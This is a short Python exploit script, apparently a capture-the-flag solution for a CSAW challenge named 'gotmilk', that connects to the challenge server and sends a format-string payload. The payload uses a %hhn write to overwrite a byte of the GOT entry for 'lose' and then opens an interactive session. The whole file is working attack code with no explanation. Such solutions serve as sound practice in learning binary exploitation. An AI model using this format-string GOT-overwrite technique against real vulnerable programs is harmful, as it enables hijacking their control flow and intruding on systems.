from ptrlib import *

elf = ELF("./gotmilk")
lib = ELF("./libmylib.so")
#sock = Process("./gotmilk", env={"LD_LIBRARY_PATH": "./"})
sock = Socket("pwn.chal.csaw.io", 1004)

payload = p32(elf.got("lose"))
payload += str2bytes('%{}c%7$hhn'.format(0x89 - 4))
sock.sendline(payload)

sock.interactive()
